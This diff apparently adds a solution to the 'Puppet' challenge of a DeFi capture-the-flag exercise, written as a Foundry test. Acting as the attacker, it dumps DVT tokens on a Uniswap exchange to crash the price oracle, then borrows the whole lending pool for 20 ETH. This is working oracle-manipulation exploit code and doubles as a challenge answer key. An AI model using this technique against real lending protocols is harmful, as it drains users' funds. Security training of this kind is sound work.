@@ -100,6 +100,14 @@ contract Puppet is Test {
         /**
          * EXPLOIT START *
          */
+        vm.startPrank(attacker);
+        //approve the token
+        dvt.approve(address(uniswapExchange), ATTACKER_INITIAL_TOKEN_BALANCE);
+        // swap most of DVT tokens with ETH calling the UniswapExchange contract
+        uniswapExchange.tokenToEthSwapInput(ATTACKER_INITIAL_TOKEN_BALANCE, 9 * 1e18, DEADLINE);
+        //Borrow all the tokens for less than 20 ETH
+        puppetPool.borrow{value: 20 ether}(POOL_INITIAL_TOKEN_BALANCE);
+        vm.stopPrank();
 
         /**
          * EXPLOIT END *
